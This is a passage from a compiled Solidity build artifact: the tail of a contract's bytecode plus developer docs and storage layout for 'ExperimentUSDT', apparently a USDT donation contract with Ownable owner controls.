f5565b60405180910390f35b610246610952565b6040516102539190610e86565b60405180910390f35b610264610977565b005b610280600480360381019061027b9190610d9a565b610aee565b005b5f30905090565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd3330846040518463ffffffff1660e01b81526004016102e793929190610e9f565b6020604051808303815f875af1158015610303573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906103279190610f09565b610366576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161035d90610f8e565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff167fd6d3eb25a413c05d8107fc49deb2789bef7f612582b2482804c0b0423b6638ee836040516103c39190610dd4565b60405180910390a350565b6103d6610b70565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb33836040518363ffffffff1660e01b8152600401610432929190610fac565b6020604051808303815f875af115801561044e573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906104729190610f09565b6104b1576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104a89061101d565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff167f84e742a3ea03623687a5febaa797636d728230721d4b3d1405d19fbbc16298d9826040516104f79190610dd4565b60405180910390a250565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231836040518263ffffffff1660e01b81526004016105859190610cf5565b602060405180830381865afa1580156105a0573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906105c4919061104f565b9050919050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663095ea7b330836040518363ffffffff1660e01b8152600401610627929190610fac565b6020604051808303815f875af1158015610643573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906106679190610f09565b6106a6576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161069d906110c4565b60405180910390fd5b3373ffffffffffffffffffffffffffffffffffffffff167f51c52de2bb698de2bdcd26d7e1c47d6eec1c8348253da8afd9c62ed9a3dd1429826040516106ec9190610dd4565b60405180910390a250565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016107529190610cf5565b602060405180830381865afa15801561076d573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610791919061104f565b905090565b61079e610b70565b6107a75f610bee565b565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb30836040518363ffffffff1660e01b8152600401610805929190610fac565b6020604051808303815f875af1158015610821573d5f803e3d5ffd5b505050506040513d601f19601f820116820180604052508101906108459190610f09565b610884576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161087b90610f8e565b60405180910390fd5b50565b5f60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e84846040518363ffffffff1660e01b81526004016108e49291906110e2565b602060405180830381865afa1580156108ff573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610923919061104f565b905092915050565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16905090565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd333060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231336040518263ffffffff1660e01b8152600401610a109190610cf5565b602060405180830381865afa158015610a2b573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610a4f919061104f565b6040518463ffffffff1660e01b8152600401610a6d93929190610e9f565b6020604051808303815f875af1158015610a89573d5f803e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610aad9190610f09565b610aec576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610ae390610f8e565b60405180910390fd5b565b610af6610b70565b5f73ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff1603610b64576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b5b90611179565b60405180910390fd5b610b6d81610bee565b50565b610b78610caf565b73ffffffffffffffffffffffffffffffffffffffff16610b9661092b565b73ffffffffffffffffffffffffffffffffffffffff1614610bec576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610be3906111e1565b60405180910390fd5b565b5f805f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050815f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055508173ffffffffffffffffffffffffffffffffffffffff168173ffffffffffffffffffffffffffffffffffffffff167f8be0079c531659141344cd1fd0a4f28419497f9722a3daafe3b4186f6b6457e060405160405180910390a35050565b5f33905090565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610cdf82610cb6565b9050919050565b610cef81610cd5565b82525050565b5f602082019050610d085f830184610ce6565b92915050565b5f80fd5b5f819050919050565b610d2481610d12565b8114610d2e575f80fd5b50565b5f81359050610d3f81610d1b565b92915050565b5f60208284031215610d5a57610d59610d0e565b5b5f610d6784828501610d31565b91505092915050565b610d7981610cd5565b8114610d83575f80fd5b50565b5f81359050610d9481610d70565b92915050565b5f60208284031215610daf57610dae610d0e565b5b5f610dbc84828501610d86565b91505092915050565b610dce81610d12565b82525050565b5f602082019050610de75f830184610dc5565b92915050565b5f8060408385031215610e0357610e02610d0e565b5b5f610e1085828601610d86565b9250506020610e2185828601610d86565b9150509250929050565b5f819050919050565b5f610e4e610e49610e4484610cb6565b610e2b565b610cb6565b9050919050565b5f610e5f82610e34565b9050919050565b5f610e7082610e55565b9050919050565b610e8081610e66565b82525050565b5f602082019050610e995f830184610e77565b92915050565b5f606082019050610eb25f830186610ce6565b610ebf6020830185610ce6565b610ecc6040830184610dc5565b949350505050565b5f8115159050919050565b610ee881610ed4565b8114610ef2575f80fd5b50565b5f81519050610f0381610edf565b92915050565b5f60208284031215610f1e57610f1d610d0e565b5b5f610f2b84828501610ef5565b91505092915050565b5f82825260208201905092915050565b7f5472616e73666572206661696c656400000000000000000000000000000000005f82015250565b5f610f78600f83610f34565b9150610f8382610f44565b602082019050919050565b5f6020820190508181035f830152610fa581610f6c565b9050919050565b5f604082019050610fbf5f830185610ce6565b610fcc6020830184610dc5565b9392505050565b7f5769746864726177616c206661696c65640000000000000000000000000000005f82015250565b5f611007601183610f34565b915061101282610fd3565b602082019050919050565b5f6020820190508181035f83015261103481610ffb565b9050919050565b5f8151905061104981610d1b565b92915050565b5f6020828403121561106457611063610d0e565b5b5f6110718482850161103b565b91505092915050565b7f417070726f76616c206661696c656400000000000000000000000000000000005f82015250565b5f6110ae600f83610f34565b91506110b98261107a565b602082019050919050565b5f6020820190508181035f8301526110db816110a2565b9050919050565b5f6040820190506110f55f830185610ce6565b6111026020830184610ce6565b9392505050565b7f4f776e61626c653a206e6577206f776e657220697320746865207a65726f20615f8201527f6464726573730000000000000000000000000000000000000000000000000000602082015250565b5f611163602683610f34565b915061116e82611109565b604082019050919050565b5f6020820190508181035f83015261119081611157565b9050919050565b7f4f776e61626c653a2063616c6c6572206973206e6f7420746865206f776e65725f82015250565b5f6111cb602083610f34565b91506111d682611197565b602082019050919050565b5f6020820190508181035f8301526111f8816111bf565b905091905056fea264697066735822122063f8c17a9a27dc17ba58a45852e7d2736756e1ee188144cc632a5290a613e51a64736f6c63430008140033",
  "devdoc": {
    "kind": "dev",
    "methods": {
      "owner()": {
        "details": "Returns the address of the current owner."
      },
      "renounceOwnership()": {
        "details": "Leaves the contract without owner. It will not be possible to call `onlyOwner` functions anymore. Can only be called by the current owner. NOTE: Renouncing ownership will leave the contract without an owner, thereby removing any functionality that is only available to the owner."
      },
      "transferOwnership(address)": {
        "details": "Transfers ownership of the contract to a new account (`newOwner`). Can only be called by the current owner."
      }
    },
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  },
  "storageLayout": {
    "storage": [
      {
        "astId": 7,
        "contract": "contracts/donate.sol:ExperimentUSDT",
        "label": "_owner",
        "offset": 0,
        "slot": "0",
        "type": "t_address"
      },
      {
        "astId": 221,
        "contract": "contracts/donate.sol:ExperimentUSDT",
        "label": "usdtToken",
        "offset": 0,
        "slot": "1",
        "type": "t_contract(IERC20)190"
      }
    ],
    "types": {
      "t_address": {
        "encoding": "inplace",
        "label": "address",
        "numberOfBytes": "20"
      },
      "t_contract(IERC20)190": {
        "encoding": "inplace",
        "label": "contract IERC20",
        "numberOfBytes": "20"
      }
    }
  }
}